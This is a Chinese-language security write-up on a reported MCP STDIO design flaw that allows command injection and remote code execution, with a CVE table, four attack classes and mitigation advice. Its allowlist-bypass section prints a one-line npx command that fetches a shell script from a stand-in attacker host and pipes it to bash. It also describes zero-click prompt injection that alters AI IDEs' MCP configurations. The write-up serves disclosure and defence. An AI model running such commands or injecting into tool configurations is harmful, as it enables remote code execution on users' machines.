# MCP 协议「设计缺陷」：200K 服务器的 RCE 供应链危机

> **时间**: 2026-04-26
> **分类**: tool-use / security
> **重要性**: P0 — 协议层系统性风险，Anthropic 拒绝修复

---

## 摘要

2026 年 4 月，OX Security 研究团队披露了一个 MCP（Model Context Protocol）协议层的结构性安全漏洞：MCP STDIO 传输机制存在设计缺陷，允许攻击者在配置界面注入任意 OS 命令，进而实现远程代码执行（RCE）。该漏洞影响了约 **200,000 台服务器**、超过 **150,000,000 次下载**的受影响软件包，并已催生 **10+ 高危/严重 CVE**。

关键事实：Anthropic 明确拒绝了修复请求，称该行为是「expected behavior」。

---

## 漏洞机制：STDIO 传输的设计陷阱

### 问题根源

MCP 使用 STDIO（Standard Input/Output）作为本地传输机制，允许 AI 应用将 MCP Server 作为子进程启动。协议规范中定义的 `command` 字段理论上用于指定服务器启动命令，但实现逻辑存在缺陷：

> 当给定一个命令，如果该命令**成功创建一个 STDIO 服务器**，则返回 handle；如果命令**执行失败**，则在命令执行后才返回错误。

这意味着攻击者可以构造恶意的 `command` 参数，利用命令执行后的副作用（如文件写入、环境变量设置）来完成攻击链，而不需要等待 STDIO 服务器真正建立。

### 四类攻击向量

OX Security 将该设计缺陷引发的漏洞分为四类：

| 类型 | 描述 | 受影响项目 |
|------|------|-----------|
| **未认证命令注入** | 直接在 UI 的 MCP 配置界面注入任意命令，无需认证 | LangFlow（全版本）、GPT Researcher（CVE-2025-65720） |
| **认证命令注入 + 硬化绕过** | 开发者对 `command` 参数做了白名单限制（如只允许 `python`、`npm`），但攻击者通过_allowed command 的参数注入实现间接攻击 | Upsonic（CVE-2026-30625）、Flowise（GHSA-c9gw-hvqq-f33r） |
| **零点击 Prompt 注入** | 用户 prompt 直接影响 MCP JSON 配置，无需用户交互 | Windsurf（CVE-2026-30615） |
| **供应链投毒** | MCP Server 配置可通过插件/模板分发，恶意配置随分发渠道传播 | 多个 MCP Apps 模板 |

### 硬化绕过的技术细节

以 Upsonic 为例：开发者将 `command` 白名单限定为 `["python", "npm", "npx"]`。但攻击者通过以下方式绕过：

```bash
npx -c "curl https://attacker.com/shell.sh | bash"
```

`-c` 参数将后续字符串作为命令传递给了 `npx`，实际执行的已经超出了白名单范围。这是 **通过合法命令的参数间接注入**，而非直接在 `command` 字段传递恶意指令。

---

## Anthropic 的立场

OX Security 研究始于 **2025 年 11 月**，经历了超过 **30 次负责任披露流程**。在与 Anthropic 多轮沟通后，Anthropic 明确回复：

> 该行为属于「expected behavior」，拒绝修改协议架构。

一周后，Anthropic 悄悄更新了安全策略文档，新增了对 STDIO 适配器的使用警告。但 OX Security 指出：

> **This change didn't fix anything.**

现有 MCP SDK（Python、TypeScript、Java、Rust）的 reference implementation 仍然包含该漏洞，任何使用官方 SDK 的开发者都会继承这一风险。

---

## 受影响的生态系统

### 已确认的 CVE

| 项目 | CVE | 严重性 | 类型 |
|------|-----|--------|------|
| Windsurf | CVE-2026-30615 | Critical | 零点击 Prompt 注入 |
| Upsonic | CVE-2026-30625 | Critical | 硬化绕过 RCE |
| GPT Researcher | CVE-2025-65720 | High | 未认证 RCE |
| Flowise | GHSA-c9gw-hvqq-f33r | High | 硬化绕过 RCE |

### 未修复项目

- **LangFlow**（IBM 开源低代码 AI 应用框架）：2026-01-11 披露，**至今无 CVE**
- **LangChain-ChatChat 0.3.1**：未认证 RCE（STDIO 配置对用户不可见但后端仍处理）

### 受影响的 AI IDE

Claude Code、Cursor、Windsurf、Gemini-CLI、GitHub Copilot 均受到第三类漏洞（零点击 Prompt 注入）影响。但除了 Windsurf 外，其他厂商均表示：

> 该问题属于「已知限制」或「需要用户显式授权才能修改配置文件」，不构成有效安全漏洞。

这是因为在大多数 IDE 中，修改 MCP 配置文件需要用户主动操作，而非被动触发。

---

## 为什么这是协议层的系统性问题

### SDK 层继承风险

MCP 生态的核心价值在于**跨语言一致性**：同一协议在 Python、TypeScript、Java、Rust 中行为一致。但这也意味着**协议层的缺陷会被所有 SDK 继承**。

任何开发者使用 Anthropic 官方 MCP SDK 构建的服务器，都会包含这一缺陷。修复路径只有两条：

1. **协议层修复**（Anthropic 拒绝）
2. **SDK 层修复**（需要所有 SDK 维护者协同，且仍有兼容性破坏风险）

### 攻击面的规模

| 指标 | 数值 |
|------|------|
| 受影响服务器 | ~200,000 |
| 受影响下载 | ~150,000,000 |
| 已发布 CVE | 10+（高危/严重） |
| 披露流程 | 30+ |
| 研究周期 | 2025-11 至今 |

---

## 与此前 MCP 安全研究的关联

本轮披露与此前已收录的多篇 MCP 安全分析形成上下文关联：

| 已有分析 | 本轮新增 |
|----------|----------|
| `mcp-security-cve-systemic-analysis-2026.md` — 30 CVEs/60 天的系统性梳理 | **本篇聚焦协议层根因**：为什么这些 CVE 会源源不断出现 |
| `mcp-dns-rebinding-cve-2026-34742-attack-surface-2026.md` — DNS 重绑定绕过 | 本篇揭示了另一类「协议设计导致」的漏洞模式 |
| `mcp-systemic-security-architecture-flaw-2026.md` — 协议层拒绝修复的代价 | **直接验证**：Anthropic 确实拒绝了根因修复 |

OX Security 的 30 页技术报告将这一模式总结为：

> **The Mother of All AI Supply Chains**

---

## 工程视角的反思

### 为什么这不只是「又一个 CVE」

传统的 CVE 描述的是**特定实现的缺陷**。但 MCP STDIO 问题揭示的是：

> **协议设计层面的缺陷，催生了一系列实现层面的 CVE，且这些 CVE 无法从根本上被消除，只能逐个修补。**

这与 SQL 注入有本质区别：SQL 注入可以通过参数化查询从协议层面根本解决；而 MCP STDIO 的命令执行语义是协议设计的一部分，「修复」意味着重新定义协议规范或引入破坏性变更。

### Anthropic 的商业逻辑

Anthropic 拒绝修复的核心逻辑可能是：

1. **向后兼容性**：修改 STDIO 传输层会破坏现有所有 MCP Server 配置
2. **责任边界**：MCP Server 的配置安全应由部署者负责，而非协议设计者
3. **替代方案**：建议企业使用 MCP HTTP 传输（远程服务器），而非本地 STDIO

但这一立场的问题是：**STDIO 是 MCP 最基础的传输机制**，大量现有部署和工具链依赖于此。协议层不修复，意味着整个生态将长期暴露在此风险下。

### 缓解建议

| 层级 | 措施 |
|------|------|
| **协议层** | 等待 Anthropic 重新评估（短期内不太可能） |
| **SDK 层** | 关注各语言 SDK 的安全更新，优先使用最新版本 |
| **部署层** | 生产环境优先使用 MCP HTTP 传输，隔离 STDIO 暴露面 |
| **企业层** | 审计所有 MCP Server 配置，禁止未验证的配置导入 |
| **开发层** | 不将用户输入直接映射到 MCP `command` 字段 |

---

## 信息来源

- OX Security 博客：https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/
- The Register 报道：https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/
- Hacker News 报道（被墙）：需通过代理访问
- OX Security 30 页技术报告：PDF 格式发布于 2026-04

---

## 相关 Articles

- `mcp-security-cve-systemic-analysis-2026.md` — 30 CVEs/60 天的系统性梳理
- `mcp-systemic-security-architecture-flaw-2026.md` — 协议层拒绝修复的代价
- `mcp-dns-rebinding-cve-2026-34742-attack-surface-2026.md` — DNS 重绑定攻击面